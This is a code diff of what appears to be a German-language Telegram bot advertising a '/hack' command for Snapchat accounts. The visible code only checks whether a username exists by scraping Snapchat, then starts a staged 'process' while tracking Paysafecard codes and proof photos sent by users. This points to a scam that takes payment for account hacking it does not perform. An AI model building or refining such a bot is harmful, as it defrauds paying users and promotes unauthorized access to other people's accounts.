@@ -3,7 +3,7 @@ from threading import Thread
 import os
 from dotenv import load_dotenv
 
-load_dotenv()  # Lädt Variablen aus .env
+load_dotenv()  # Lädt die Variablen aus .env
 
 TOKEN = os.getenv("TOKEN")
 CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
@@ -27,7 +27,12 @@ import re
 import requests
 from bs4 import BeautifulSoup
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    InputMediaPhoto,
+)
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -38,16 +43,25 @@ from telegram.ext import (
 )
 from telegram.constants import ParseMode
 
+# Lade die sensiblen Daten aus der .env Datei
+TOKEN = os.getenv("TOKEN")
+CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
+ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))
+
+# Session-Variable für Paysafe-Code-Sendung (simple Variante)
 user_paysafe_sent = set()
 
 def check_snapchat_username_exists_and_get_name(username: str):
     url = f"https://www.snapchat.com/@{username}"
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    }
     try:
         resp = requests.get(url, headers=headers, timeout=10)
         if resp.status_code == 200:
             if "Sorry, this account doesn’t exist." in resp.text or "Not Found" in resp.text:
                 return False, None
+            
             soup = BeautifulSoup(resp.text, "html.parser")
             title = soup.find("title")
             if title:
@@ -64,7 +78,7 @@ def check_snapchat_username_exists_and_get_name(username: str):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        "🌟 Bitte join zuerst den Kanal, um den Bot zu nutzen! 🌟\n\n"
+        "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
         "👉 https://t.me/+xSnJBwXX-g05Yjcy\n\n"
         "📢 Nach dem Beitritt kannst du sofort starten:\n"
         "/hack Benutzername\n\n"
@@ -75,7 +89,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # Kanalmitgliedschaft prüfen
+    # Kanal-Mitgliedschaft prüfen
     try:
         member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
         if member.status in ["left", "kicked"]:
@@ -95,13 +109,9 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     username = context.args[0]
 
-    # Snapchat check (hier synchron)
     exists, name = check_snapchat_username_exists_and_get_name(username)
     if not exists:
-        await update.message.reply_text(
-            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
-            parse_mode=ParseMode.MARKDOWN,
-        )
+        await update.message.reply_text(f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.", parse_mode=ParseMode.MARKDOWN)
         return
 
     msg = await update.message.reply_text("🚀 Starte den Vorgang...")
@@ -249,8 +259,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Bitte benutze die vorgegebenen Befehle oder sende ein gültiges Beweisfoto.")
 
 def main():
-    keep_alive()
-
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
